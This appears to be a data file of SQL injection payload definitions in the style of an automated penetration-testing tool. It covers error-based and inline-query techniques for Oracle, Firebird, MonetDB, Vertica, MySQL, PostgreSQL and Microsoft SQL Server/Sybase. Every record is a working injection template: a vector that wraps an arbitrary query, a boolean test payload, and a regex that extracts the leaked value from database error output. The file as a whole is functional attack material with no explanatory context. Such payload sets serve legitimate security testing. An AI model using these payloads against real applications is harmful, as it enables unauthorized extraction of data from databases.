{"title": "Oracle AND error-based - WHERE or HAVING clause (XMLType)", "stype": 2, "level": 1, "risk": 1, "clause": [1, 9], "where": [1], "vector": "AND [RANDNUM]=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||'[DELIMITER_START]'||(REPLACE(REPLACE(REPLACE(REPLACE(([QUERY]),' ','[SPACE_REPLACE]'),'$','[DOLLAR_REPLACE]'),'@','[AT_REPLACE]'),'#','[HASH_REPLACE]'))||'[DELIMITER_STOP]'||CHR(62))) FROM DUAL)", "request": {"payload": "AND [RANDNUM]=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||'[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL)||'[DELIMITER_STOP]'||CHR(62))) FROM DUAL)"}, "response": {"grep": "[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]"}, "details": {"dbms": "Oracle"}}
{"title": "Oracle OR error-based - WHERE or HAVING clause (XMLType)", "stype": 2, "level": 1, "risk": 3, "clause": [1, 9], "where": [2], "vector": "OR [RANDNUM]=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||'[DELIMITER_START]'||(REPLACE(REPLACE(REPLACE(([QUERY]),' ','[SPACE_REPLACE]'),'$','[DOLLAR_REPLACE]'),'@','[AT_REPLACE]'))||'[DELIMITER_STOP]'||CHR(62))) FROM DUAL)", "request": {"payload": "OR [RANDNUM]=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||'[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL)||'[DELIMITER_STOP]'||CHR(62))) FROM DUAL)"}, "response": {"grep": "[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]"}, "details": {"dbms": "Oracle"}}
{"title": "Oracle AND error-based - WHERE or HAVING clause (UTL_INADDR.GET_HOST_ADDRESS)", "stype": 2, "level": 2, "risk": 1, "clause": [1, 9], "where": [1], "vector": "AND [RANDNUM]=UTL_INADDR.GET_HOST_ADDRESS('[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]')", "request": {"payload": "AND [RANDNUM]=UTL_INADDR.GET_HOST_ADDRESS('[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL)||'[DELIMITER_STOP]')"}, "response": {"grep": "[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]"}, "details": {"dbms": "Oracle", "dbms_version": ">= 8.1.6"}}
{"title": "Oracle OR error-based - WHERE or HAVING clause (UTL_INADDR.GET_HOST_ADDRESS)", "stype": 2, "level": 2, "risk": 3, "clause": [1, 9], "where": [2], "vector": "OR [RANDNUM]=UTL_INADDR.GET_HOST_ADDRESS('[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]')", "request": {"payload": "OR [RANDNUM]=UTL_INADDR.GET_HOST_ADDRESS('[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL)||'[DELIMITER_STOP]')"}, "response": {"grep": "[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]"}, "details": {"dbms": "Oracle", "dbms_version": ">= 8.1.6"}}
{"title": "Oracle AND error-based - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)", "stype": 2, "level": 3, "risk": 1, "clause": [1, 9], "where": [1], "vector": "AND [RANDNUM]=CTXSYS.DRITHSX.SN([RANDNUM],'[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]')", "request": {"payload": "AND [RANDNUM]=CTXSYS.DRITHSX.SN([RANDNUM],('[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL)||'[DELIMITER_STOP]'))"}, "response": {"grep": "[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]"}, "details": {"dbms": "Oracle"}}
{"title": "Oracle OR error-based - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)", "stype": 2, "level": 3, "risk": 3, "clause": [1, 9], "where": [2], "vector": "OR [RANDNUM]=CTXSYS.DRITHSX.SN([RANDNUM],'[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]')", "request": {"payload": "OR [RANDNUM]=CTXSYS.DRITHSX.SN([RANDNUM],('[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL)||'[DELIMITER_STOP]'))"}, "response": {"grep": "[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]"}, "details": {"dbms": "Oracle"}}
{"title": "Oracle AND error-based - WHERE or HAVING clause (DBMS_UTILITY.SQLID_TO_SQLHASH)", "stype": 2, "level": 4, "risk": 1, "clause": [1, 9], "where": [1], "vector": "AND [RANDNUM]=DBMS_UTILITY.SQLID_TO_SQLHASH('[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]')", "request": {"payload": "AND [RANDNUM]=DBMS_UTILITY.SQLID_TO_SQLHASH(('[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL)||'[DELIMITER_STOP]'))"}, "response": {"grep": "[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]"}, "details": {"dbms": "Oracle"}}
{"title": "Oracle OR error-based - WHERE or HAVING clause (DBMS_UTILITY.SQLID_TO_SQLHASH)", "stype": 2, "level": 4, "risk": 3, "clause": [1, 9], "where": [2], "vector": "OR [RANDNUM]=DBMS_UTILITY.SQLID_TO_SQLHASH('[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]')", "request": {"payload": "OR [RANDNUM]=DBMS_UTILITY.SQLID_TO_SQLHASH(('[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL)||'[DELIMITER_STOP]'))"}, "response": {"grep": "[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]"}, "details": {"dbms": "Oracle"}}
{"title": "Firebird AND error-based - WHERE or HAVING clause", "stype": 2, "level": 3, "risk": 1, "clause": [1, 9], "where": [1], "vector": "AND [RANDNUM]=('[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]')", "request": {"payload": "AND [RANDNUM]=('[DELIMITER_START]'||(SELECT CASE [RANDNUM] WHEN [RANDNUM] THEN 1 ELSE 0 END FROM RDB$DATABASE)||'[DELIMITER_STOP]')"}, "response": {"grep": "[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]"}, "details": {"dbms": "Firebird"}}
{"title": "Firebird OR error-based - WHERE or HAVING clause", "stype": 2, "level": 3, "risk": 3, "clause": [1, 9], "where": [2], "vector": "OR [RANDNUM]=('[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]')", "request": {"payload": "OR [RANDNUM]=('[DELIMITER_START]'||(SELECT CASE [RANDNUM] WHEN [RANDNUM] THEN 1 ELSE 0 END FROM RDB$DATABASE)||'[DELIMITER_STOP]')"}, "response": {"grep": "[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]"}, "details": {"dbms": "Firebird"}}
{"title": "MonetDB AND error-based - WHERE or HAVING clause", "stype": 2, "level": 3, "risk": 1, "clause": [1, 9], "where": [1], "vector": "AND [RANDNUM]=('[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]')", "request": {"payload": "AND [RANDNUM]=('[DELIMITER_START]'||(SELECT CASE [RANDNUM] WHEN [RANDNUM] THEN CODE(49) ELSE CODE(48) END)||'[DELIMITER_STOP]')"}, "response": {"grep": "[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]"}, "details": {"dbms": "MonetDB"}}
{"title": "MonetDB OR error-based - WHERE or HAVING clause", "stype": 2, "level": 3, "risk": 3, "clause": [1, 9], "where": [2], "vector": "OR [RANDNUM]=('[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]')", "request": {"payload": "OR [RANDNUM]=('[DELIMITER_START]'||(SELECT CASE [RANDNUM] WHEN [RANDNUM] THEN CODE(49) ELSE CODE(48) END)||'[DELIMITER_STOP]')"}, "response": {"grep": "[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]"}, "details": {"dbms": "MonetDB"}}
{"title": "Vertica AND error-based - WHERE or HAVING clause", "stype": 2, "level": 3, "risk": 1, "clause": [1, 8, 9], "where": [1], "vector": "AND [RANDNUM]=CAST('[DELIMITER_START]'||([QUERY])::varchar||'[DELIMITER_STOP]' AS NUMERIC)", "request": {"payload": "AND [RANDNUM]=CAST('[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN BITCOUNT(BITSTRING_TO_BINARY('1')) ELSE BITCOUNT(BITSTRING_TO_BINARY('0')) END))::varchar||'[DELIMITER_STOP]' AS NUMERIC)"}, "response": {"grep": "[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]"}, "details": {"dbms": "Vertica"}}
{"title": "Vertica OR error-based - WHERE or HAVING clause", "stype": 2, "level": 3, "risk": 3, "clause": [1, 8, 9], "where": [2], "vector": "OR [RANDNUM]=CAST('[DELIMITER_START]'||([QUERY])::varchar||'[DELIMITER_STOP]' AS NUMERIC)", "request": {"payload": "OR [RANDNUM]=CAST('[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN BITCOUNT(BITSTRING_TO_BINARY('1')) ELSE BITCOUNT(BITSTRING_TO_BINARY('0')) END))::varchar||'[DELIMITER_STOP]' AS NUMERIC)"}, "response": {"grep": "[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]"}, "details": {"dbms": "Vertica"}}
{"title": "MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)", "stype": 2, "level": 2, "risk": 1, "clause": [1, 2, 3, 4, 5], "where": [1], "vector": "PROCEDURE ANALYSE(EXTRACTVALUE([RANDNUM],CONCAT('\\','[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]')),1)", "request": {"payload": "PROCEDURE ANALYSE(EXTRACTVALUE([RANDNUM],CONCAT('\\','[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]')),1)"}, "response": {"grep": "[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]"}, "details": {"dbms": "MySQL", "dbms_version": ">= 5.1"}}
{"title": "MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)", "stype": 2, "level": 5, "risk": 1, "clause": [1, 2, 3, 9], "where": [3], "vector": "(SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]','x'))s), 8446744073709551610, 8446744073709551610)))", "request": {"payload": "(SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]','x'))s), 8446744073709551610, 8446744073709551610)))"}, "response": {"grep": "[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]"}, "details": {"dbms": "MySQL", "dbms_version": ">= 5.5"}}
{"title": "MySQL >= 5.5 error-based - Parameter replace (EXP)", "stype": 2, "level": 5, "risk": 1, "clause": [1, 2, 3, 9], "where": [3], "vector": "EXP(~(SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]','x'))x))", "request": {"payload": "EXP(~(SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]','x'))x))"}, "response": {"grep": "[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]"}, "details": {"dbms": "MySQL", "dbms_version": ">= 5.5"}}
{"title": "MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)", "stype": 2, "level": 5, "risk": 1, "clause": [1, 2, 3, 9], "where": [3], "vector": "JSON_KEYS((SELECT CONVERT((SELECT CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]')) USING utf8)))", "request": {"payload": "JSON_KEYS((SELECT CONVERT((SELECT CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]')) USING utf8)))"}, "response": {"grep": "[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]"}, "details": {"dbms": "MySQL", "dbms_version": ">= 5.7.8"}}
{"title": "MySQL >= 5.0 error-based - Parameter replace (FLOOR)", "stype": 2, "level": 1, "risk": 1, "clause": [1, 2, 3, 9], "where": [3], "vector": "(SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)", "request": {"payload": "(SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)"}, "response": {"grep": "[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]"}, "details": {"dbms": "MySQL", "dbms_version": ">= 5.0"}}
{"title": "MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)", "stype": 2, "level": 4, "risk": 1, "clause": [1, 2, 3, 9], "where": [3], "vector": "(UPDATEXML([RANDNUM],CONCAT('.','[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'),[RANDNUM1]))", "request": {"payload": "(UPDATEXML([RANDNUM],CONCAT('.','[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]'),[RANDNUM1]))"}, "response": {"grep": "[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]"}, "details": {"dbms": "MySQL", "dbms_version": ">= 5.1"}}
{"title": "MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)", "stype": 2, "level": 3, "risk": 1, "clause": [1, 2, 3, 9], "where": [3], "vector": "(EXTRACTVALUE([RANDNUM],CONCAT('\\','[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]')))", "request": {"payload": "(EXTRACTVALUE([RANDNUM],CONCAT('\\','[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]')))"}, "response": {"grep": "[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]"}, "details": {"dbms": "MySQL", "dbms_version": ">= 5.1"}}
{"title": "PostgreSQL error-based - Parameter replace", "stype": 2, "level": 2, "risk": 1, "clause": [1, 2, 3, 9], "where": [3], "vector": "(CAST('[DELIMITER_START]'||([QUERY])::text||'[DELIMITER_STOP]' AS NUMERIC))", "request": {"payload": "(CAST('[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END))::text||'[DELIMITER_STOP]' AS NUMERIC))"}, "response": {"grep": "[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]"}, "details": {"dbms": "PostgreSQL"}}
{"title": "PostgreSQL error-based - Parameter replace (GENERATE_SERIES)", "stype": 2, "level": 5, "risk": 1, "clause": [1, 2, 3, 9], "where": [3], "vector": "(CAST('[DELIMITER_START]'||([QUERY])::text||'[DELIMITER_STOP]' AS NUMERIC))", "request": {"payload": "(CAST('[DELIMITER_START]'||(SELECT 1 FROM GENERATE_SERIES([RANDNUM],[RANDNUM],CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) LIMIT 1)::text||'[DELIMITER_STOP]' AS NUMERIC))"}, "response": {"grep": "[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]"}, "details": {"dbms": "PostgreSQL"}}
{"title": "Microsoft SQL Server/Sybase error-based - Parameter replace", "stype": 2, "level": 3, "risk": 1, "clause": [1, 3], "where": [3], "vector": "(CONVERT(INT,(SELECT '[DELIMITER_START]'+([QUERY])+'[DELIMITER_STOP]')))", "request": {"payload": "(CONVERT(INT,(SELECT '[DELIMITER_START]'+(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END))+'[DELIMITER_STOP]')))"}, "response": {"grep": "[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]"}, "details": {"dbms": ["Microsoft SQL Server", "Sybase"], "os": "Windows"}}
{"title": "Microsoft SQL Server/Sybase error-based - Parameter replace (integer column)", "stype": 2, "level": 4, "risk": 1, "clause": [1, 3], "where": [3], "vector": "(SELECT '[DELIMITER_START]'+([QUERY])+'[DELIMITER_STOP]')", "request": {"payload": "(SELECT '[DELIMITER_START]'+(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END))+'[DELIMITER_STOP]')"}, "response": {"grep": "[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]"}, "details": {"dbms": ["Microsoft SQL Server", "Sybase"], "os": "Windows"}}
{"title": "Oracle error-based - Parameter replace", "stype": 2, "level": 3, "risk": 1, "clause": [1, 3], "where": [3], "vector": "(SELECT UPPER(XMLType(CHR(60)||CHR(58)||'[DELIMITER_START]'||(REPLACE(REPLACE(REPLACE(([QUERY]),' ','[SPACE_REPLACE]'),'$','[DOLLAR_REPLACE]'),'@','[AT_REPLACE]'))||'[DELIMITER_STOP]'||CHR(62))) FROM DUAL)", "request": {"payload": "(SELECT UPPER(XMLType(CHR(60)||CHR(58)||'[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL)||'[DELIMITER_STOP]'||CHR(62))) FROM DUAL)"}, "response": {"grep": "[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]"}, "details": {"dbms": "Oracle"}}
{"title": "Firebird error-based - Parameter replace", "stype": 2, "level": 4, "risk": 1, "clause": [1, 3], "where": [3], "vector": "(SELECT [RANDNUM]=('[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]'))", "request": {"payload": "(SELECT [RANDNUM]=('[DELIMITER_START]'||(SELECT CASE [RANDNUM] WHEN [RANDNUM] THEN 1 ELSE 0 END FROM RDB$DATABASE)||'[DELIMITER_STOP]'))"}, "response": {"grep": "[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]"}, "details": {"dbms": "Firebird"}}
{"title": "MySQL >= 5.5 error-based - ORDER BY, GROUP BY clause (BIGINT UNSIGNED)", "stype": 2, "level": 5, "risk": 1, "clause": [2, 3], "where": [1], "vector": ",(SELECT [RANDNUM] FROM (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]','x'))s), 8446744073709551610, 8446744073709551610)))x)", "request": {"payload": ",(SELECT [RANDNUM] FROM (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]','x'))s), 8446744073709551610, 8446744073709551610)))x)"}, "response": {"grep": "[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]"}, "details": {"dbms": "MySQL", "dbms_version": ">= 5.5"}}
{"title": "MySQL >= 5.5 error-based - ORDER BY, GROUP BY clause (EXP)", "stype": 2, "level": 5, "risk": 1, "clause": [2, 3], "where": [1], "vector": ",(SELECT [RANDNUM] FROM (SELECT EXP(~(SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]','x'))x)))s)", "request": {"payload": ",(SELECT [RANDNUM] FROM (SELECT EXP(~(SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]','x'))x)))s)"}, "response": {"grep": "[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]"}, "details": {"dbms": "MySQL", "dbms_version": ">= 5.5"}}
{"title": "MySQL >= 5.7.8 error-based - ORDER BY, GROUP BY clause (JSON_KEYS)", "stype": 2, "level": 5, "risk": 1, "clause": [2, 3], "where": [1], "vector": ",(SELECT [RANDNUM] FROM (SELECT JSON_KEYS((SELECT CONVERT((SELECT CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]')) USING utf8))))x)", "request": {"payload": ",(SELECT [RANDNUM] FROM (SELECT JSON_KEYS((SELECT CONVERT((SELECT CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]')) USING utf8))))x)"}, "response": {"grep": "[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]"}, "details": {"dbms": "MySQL", "dbms_version": ">= 5.7.8"}}
{"title": "MySQL >= 5.0 error-based - ORDER BY, GROUP BY clause (FLOOR)", "stype": 2, "level": 3, "risk": 1, "clause": [2, 3], "where": [1], "vector": ",(SELECT 1 FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)", "request": {"payload": ",(SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)"}, "response": {"grep": "[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]"}, "details": {"dbms": "MySQL", "dbms_version": ">= 5.0"}}
{"title": "MySQL >= 5.1 error-based - ORDER BY, GROUP BY clause (EXTRACTVALUE)", "stype": 2, "level": 4, "risk": 1, "clause": [2, 3], "where": [1], "vector": ",EXTRACTVALUE([RANDNUM],CONCAT('\\','[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'))", "request": {"payload": ",EXTRACTVALUE([RANDNUM],CONCAT('\\','[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]'))"}, "response": {"grep": "[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]"}, "details": {"dbms": "MySQL", "dbms_version": ">= 5.1"}}
{"title": "MySQL >= 5.1 error-based - ORDER BY, GROUP BY clause (UPDATEXML)", "stype": 2, "level": 5, "risk": 1, "clause": [2, 3], "where": [1], "vector": ",UPDATEXML([RANDNUM],CONCAT('.','[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'),[RANDNUM1])", "request": {"payload": ",UPDATEXML([RANDNUM],CONCAT('.','[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]'),[RANDNUM1])"}, "response": {"grep": "[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]"}, "details": {"dbms": "MySQL", "dbms_version": ">= 5.1"}}
{"title": "MySQL >= 4.1 error-based - ORDER BY, GROUP BY clause (FLOOR)", "stype": 2, "level": 2, "risk": 1, "clause": [2, 3], "where": [1], "vector": ",(SELECT [RANDNUM] FROM (SELECT ROW([RANDNUM],[RANDNUM1])>(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM (SELECT [RANDNUM2] UNION SELECT [RANDNUM3] UNION SELECT [RANDNUM4] UNION SELECT [RANDNUM5])a GROUP BY x))s)", "request": {"payload": ",(SELECT [RANDNUM] FROM (SELECT ROW([RANDNUM],[RANDNUM1])>(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM (SELECT [RANDNUM2] UNION SELECT [RANDNUM3] UNION SELECT [RANDNUM4] UNION SELECT [RANDNUM5])a GROUP BY x))s)"}, "response": {"grep": "[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]"}, "details": {"dbms": "MySQL", "dbms_version": ">= 4.1"}}
{"title": "PostgreSQL error-based - ORDER BY, GROUP BY clause", "stype": 2, "level": 3, "risk": 1, "clause": [2, 3], "where": [1], "vector": ",(CAST('[DELIMITER_START]'||([QUERY])::text||'[DELIMITER_STOP]' AS NUMERIC))", "request": {"payload": ",(CAST('[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END))::text||'[DELIMITER_STOP]' AS NUMERIC))"}, "response": {"grep": "[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]"}, "details": {"dbms": "PostgreSQL"}}
{"title": "PostgreSQL error-based - ORDER BY, GROUP BY clause (GENERATE_SERIES)", "stype": 2, "level": 5, "risk": 1, "clause": [2, 3], "where": [1], "vector": ",(CAST('[DELIMITER_START]'||([QUERY])::text||'[DELIMITER_STOP]' AS NUMERIC))", "request": {"payload": ",(CAST('[DELIMITER_START]'||(SELECT 1 FROM GENERATE_SERIES([RANDNUM],[RANDNUM],CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) LIMIT 1)::text||'[DELIMITER_STOP]' AS NUMERIC))"}, "response": {"grep": "[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]"}, "details": {"dbms": "PostgreSQL"}}
{"title": "Microsoft SQL Server/Sybase error-based - ORDER BY clause", "stype": 2, "level": 4, "risk": 1, "clause": [3], "where": [1], "vector": ",(SELECT [RANDNUM] WHERE [RANDNUM]=CONVERT(INT,(SELECT '[DELIMITER_START]'+([QUERY])+'[DELIMITER_STOP]')))", "request": {"payload": ",(SELECT [RANDNUM] WHERE [RANDNUM]=CONVERT(INT,(SELECT '[DELIMITER_START]'+(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END))+'[DELIMITER_STOP]')))"}, "response": {"grep": "[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]"}, "details": {"dbms": ["Microsoft SQL Server", "Sybase"], "os": "Windows"}}
{"title": "Oracle error-based - ORDER BY, GROUP BY clause", "stype": 2, "level": 4, "risk": 1, "clause": [2, 3], "where": [1], "vector": ",(SELECT UPPER(XMLType(CHR(60)||CHR(58)||'[DELIMITER_START]'||(REPLACE(REPLACE(REPLACE(([QUERY]),' ','[SPACE_REPLACE]'),'$','[DOLLAR_REPLACE]'),'@','[AT_REPLACE]'))||'[DELIMITER_STOP]'||CHR(62))) FROM DUAL)", "request": {"payload": ",(SELECT UPPER(XMLType(CHR(60)||CHR(58)||'[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL)||'[DELIMITER_STOP]'||CHR(62))) FROM DUAL)"}, "response": {"grep": "[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]"}, "details": {"dbms": "Oracle"}}
{"title": "Firebird error-based - ORDER BY clause", "stype": 2, "level": 5, "risk": 1, "clause": [2, 3], "where": [1], "vector": ",(SELECT [RANDNUM]=('[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]'))", "request": {"payload": ",(SELECT [RANDNUM]=('[DELIMITER_START]'||(SELECT CASE [RANDNUM] WHEN [RANDNUM] THEN 1 ELSE 0 END FROM RDB$DATABASE)||'[DELIMITER_STOP]'))"}, "response": {"grep": "[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]"}, "details": {"dbms": "Firebird"}}
{"title": "Generic inline queries", "stype": 3, "level": 1, "risk": 1, "clause": [1, 2, 3, 8], "where": [3], "vector": "(SELECT CONCAT(CONCAT('[DELIMITER_START]',([QUERY])),'[DELIMITER_STOP]'))", "request": {"payload": "(SELECT CONCAT(CONCAT('[DELIMITER_START]',(CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END)),'[DELIMITER_STOP]'))"}, "response": {"grep": "[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]"}}
{"title": "MySQL inline queries", "stype": 3, "level": 2, "risk": 1, "clause": [1, 2, 3, 8], "where": [3], "vector": "(SELECT CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'))", "request": {"payload": "(SELECT CONCAT('[DELIMITER_START]',(ELT([RANDNUM]=[RANDNUM],1)),'[DELIMITER_STOP]'))"}, "response": {"grep": "[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]"}, "details": {"dbms": "MySQL"}}
{"title": "PostgreSQL inline queries", "stype": 3, "level": 2, "risk": 1, "clause": [1, 2, 3, 8], "where": [3], "vector": "(SELECT '[DELIMITER_START]'||([QUERY])::text||'[DELIMITER_STOP]')", "request": {"payload": "(SELECT '[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END))::text||'[DELIMITER_STOP]')"}, "response": {"grep": "[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]"}, "details": {"dbms": "PostgreSQL"}}
{"title": "Microsoft SQL Server/Sybase inline queries", "stype": 3, "level": 2, "risk": 1, "clause": [1, 2, 3, 8], "where": [3], "vector": "(SELECT '[DELIMITER_START]'+([QUERY])+'[DELIMITER_STOP]')", "request": {"payload": "(SELECT '[DELIMITER_START]'+(CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END)+'[DELIMITER_STOP]')"}, "response": {"grep": "[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]"}, "details": {"dbms": ["Microsoft SQL Server", "Sybase"], "os": "Windows"}}
